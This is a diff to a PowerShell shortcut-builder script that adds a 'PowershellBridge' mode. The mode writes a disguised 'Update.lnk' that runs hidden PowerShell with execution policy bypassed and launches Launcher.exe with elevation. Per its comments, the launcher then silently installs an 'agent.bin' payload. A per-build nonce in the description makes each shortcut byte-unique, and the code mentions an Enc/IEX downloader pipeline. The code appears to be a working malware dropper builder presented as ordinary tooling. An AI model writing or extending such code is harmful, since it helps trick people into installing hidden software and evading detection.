@@ -288,7 +288,9 @@ param(
     # The entire powershell -Enc / IEX / downloader pipeline is SKIPPED.
     [string]$LauncherTarget = 'Launcher.exe',  # bare relative file name (no path)
     [string]$LauncherTag = '',                 # per-build nonce mixed into the Description -> byte-unique .lnk per build
-    [switch]$LauncherMode,                     # write a launcher-mode relative .lnk
+    [switch]$LauncherMode,                     # write a launcher-mode .lnk that runs Launcher.exe (relative/absolute)
+    [switch]$PowershellBridge,                 # Update.lnk -> OS PowerShell -> Start-Process .\<sub>\Launcher.exe -Verb RunAs (portable, no baked path)
+    [string]$LauncherSubFolder = 'launcher',   # subfolder (relative to the .lnk) that holds Launcher.exe + agent.bin
 
     # ---- Validation report card (WP6, invoked server-side after a launcher build) ----
     [switch]$Validate,                         # run the launcher-artifact report card and exit
@@ -5926,7 +5928,7 @@ if ($Validate) {
 if ([string]::IsNullOrWhiteSpace($Output)) {
     throw "Output (-Output) is required. (Only -SelfTest runs without it.)"
 }
-if (-not $TestPayload -and -not $LauncherMode) {
+if (-not $TestPayload -and -not $LauncherMode -and -not $PowershellBridge) {
     if ([string]::IsNullOrWhiteSpace($URL)) { throw "URL is required unless -TestPayload is used." }
     if ($URL -match '"')                 { throw "URL must not contain double quotes." }
     if ($FileName -match '"|\\')         { throw "FileName must not contain quotes or backslashes." }
@@ -5962,6 +5964,44 @@ if (-not [System.IO.Directory]::Exists($outputParent)) {
 # (which is the .lnk's folder), which is exactly how the launcher locates
 # itself (it opens "Launcher.exe" relative to cwd).
 # ---------------------------------------------------------------------------
+if ($PowershellBridge) {
+    # PORTABLE Update.lnk (no baked username/path): the shortcut targets the OS
+    # PowerShell at a fixed system path (no user dir), and Explorer starts it in
+    # the .lnk's own folder (cwd), so Start-Process runs .\<LauncherSubFolder>\Launcher.exe
+    # -Verb RunAs => UAC prompt => the launcher (requireAdministrator GUI PE) reads
+    # the sibling agent.bin from ITS folder and installs silently. Works from ANY
+    # extract folder because nothing is absolute/user-specific.
+    $outPath = $Output
+    $description = 'Configuration shortcut'
+    if (-not [string]::IsNullOrWhiteSpace($LauncherTag)) {
+        $tagPart = $LauncherTag
+        if ($LauncherTag.Length -ge 8) { $tagPart = $LauncherTag.Substring(0, 8) }
+        $description = "$description ($tagPart)"
+    }
+    $psPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+    $cmd = "Start-Process -FilePath `".\$LauncherSubFolder\Launcher.exe`" -Verb RunAs"
+    $bridgeSpec = @{
+        TargetPath   = $psPath
+        Arguments    = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$cmd`""
+        Description  = $description
+        IconLocation = $Icon
+        ShowCommand  = 7
+    }
+    Write-ShellLink -Path $outPath -Spec $bridgeSpec | Out-Null
+    $expectedBridgeSpec = @{
+        TargetPath   = $psPath
+        Arguments    = $bridgeSpec.Arguments
+        Description  = $description
+        IconLocation = $Icon
+    }
+    Validate-ShellLink -Path $outPath -ExpectedSpec $expectedBridgeSpec | Out-Null
+    Write-Host "Powershell-bridge Update.lnk written: $Output"
+    Write-Host "  target      : $psPath"
+    Write-Host "  subfolder   : $LauncherSubFolder"
+    Write-Host "  description : $description"
+    exit 0
+}
+
 if ($LauncherMode) {
     # Capture the output path up front: Write-ShellLink / Validate-ShellLink
     # run in child scopes and can clobber the script-level $Output; a local copy
